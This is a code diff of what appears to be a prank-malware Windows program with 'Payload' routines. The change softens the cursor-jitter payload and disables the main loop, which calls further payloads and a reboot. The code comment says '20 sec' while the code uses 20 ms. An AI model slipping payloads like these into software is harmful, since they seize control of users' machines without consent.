@@ -94,17 +94,17 @@ void PayloadMessageBox(void)
 void PayloadCursor(void)
 {
 	POINT cursor;
-	std::uniform_int_distribution<int> dist(0, 2);
+	std::uniform_int_distribution<int> dist(-1, 1);
 
-	// TODO: scale less horribly early
+	// ~DONE~: scale less horribly early
+	//	Removed scaling, looks better with a static 1px movement every 20 sec
 	for (;;) {
 		GetCursorPos(&cursor);
-
-		cursor.x += ((dist(mt) - 1) * 2) * runtime / 2;
-		cursor.y += ((dist(mt) - 1) * 2) * runtime / 2;
+		cursor.x += dist(mt);
+		cursor.y += dist(mt);
 		SetCursorPos(cursor.x, cursor.y);
 
-		std::this_thread::sleep_for(std::chrono::milliseconds(max(0, MAX_RUNTIME * 40 - (runtime + 1) * 40)));
+		std::this_thread::sleep_for(std::chrono::milliseconds(20));
 	}
 }
 
@@ -259,7 +259,9 @@ void yesnobox(void) {
 
 int main(void)
 {
-
+	runtime = 5;
+	PayloadCursor();
+#if 0
 
 	for (;;) {
 
@@ -294,4 +296,5 @@ int main(void)
 		}
 		reboot();
 	}
+#endif
 }
